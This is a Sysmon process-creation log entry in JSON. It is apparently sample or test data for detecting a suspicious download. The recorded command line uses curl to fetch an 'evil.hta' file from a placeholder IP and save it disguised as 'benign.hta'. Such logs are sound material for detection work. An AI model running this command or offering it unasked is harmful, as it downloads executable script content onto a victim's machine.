{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-12-11T06:34:20.042883Z"
        }
      },
      "EventRecordID": 21588,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3208,
          "ThreadID": 1724
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2025-12-11 06:34:19.983",
      "ProcessGuid": "0197231E-65EB-693A-F112-000000000800",
      "ProcessId": 14440,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "FileVersion": "8.10.1",
      "Description": "The curl executable",
      "Product": "The curl executable",
      "Company": "curl, https://curl.se/",
      "OriginalFileName": "curl.exe",
      "CommandLine": "curl  --output benign.hta \"https://12.34.56.78/hack/evil.hta\"",
      "CurrentDirectory": "C:\\Users\\xodih\\AppData\\Local\\Temp\\",
      "User": "swachchhanda\\xodih",
      "LogonGuid": "0197231E-AB9F-67AA-FB17-030000000000",
      "LogonId": "0x317fb",
      "TerminalSessionId": 1,
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=DBB2D090D2098B2B995FA067FDEF839F,SHA256=8955D2A45404A59C2E3772F3C76AEEAE48AEDF100BE328C003D7A4DF5342B491,IMPHASH=213443B550A6683661EB0CF00CF04681",
      "ParentProcessGuid": "0197231E-F570-6938-8A10-000000000800",
      "ParentProcessId": 14736,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
      "ParentUser": "swachchhanda\\xodih"
    }
  }
}
